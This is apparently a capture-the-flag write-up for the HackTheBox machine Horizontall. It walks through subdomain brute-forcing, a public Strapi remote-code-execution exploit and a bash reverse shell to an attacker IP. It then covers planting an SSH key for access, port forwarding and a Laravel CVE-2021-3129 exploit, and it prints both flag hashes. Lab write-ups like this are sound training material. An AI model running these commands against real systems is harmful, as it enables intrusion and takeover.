# Horizontall.htb
### IP-10.10.11.105 Difficulty-Easy

Started nmap scan on the IP and found 2 open ports:

```
22 - SSH
80 - HTTP
```

Entered the IP and a hostname in the hosts file and started a gobuster scan on the IP to brute directories but got nothing useful.
Then started to brute sub-domains using gobuster itself.

```
gobuster vhost -u horizontall.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

Luckily after much time got a sub-domain:

```
api-prod.horizontall.htb
```

Added this subdomain into the hosts file and started another gobuster scan on this sub-domain.
After enumerating, I found it was using strapi CMS with available exploit of RCE and downloaded the [python](exploit-db.com/exploits/50239) code and executed it.

Got a reverse shell but it was not stable so to get another reverse shell I ran:

```
bash -c 'bash -i >& /dev/tcp/10.10.14.185/5555 0>&1'
```

Got the user.txt.

```
042416f86baccb2d2b1d7e7aed96adc8
```

After that I noticed that some ports are running locally like 3306 and 8000.
Found that 8000 is running laravel php script of version 8.

Found an exploit for this.(cve2021–3129)

But for this exploit, I needed to forward the 8000 port so that I can access this port from my machine.

To do this, I used ssh port forwarding.

In my attackbox I created new ssh keys by ssh-keygen and copied the public key into the authorized_keys file in strapi user's .ssh folder.
After that changed permissions of the private ssh file to 600 and then running the command in attackbox.

```
ssh -i id_rsa -L 8000:127.0.0.1:8000 strapi@horizontall.htb
```

After this I successfully forwarded the port to my machine and I can exploit it.

Found [this](https://github.com/nth347/CVE-2021-3129_exploit) exploit for RCE and ran the command:

```
./laravel.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt"
```

And got the root.txt

```
a84dd8478f339b76062a3f9535b1d211
```
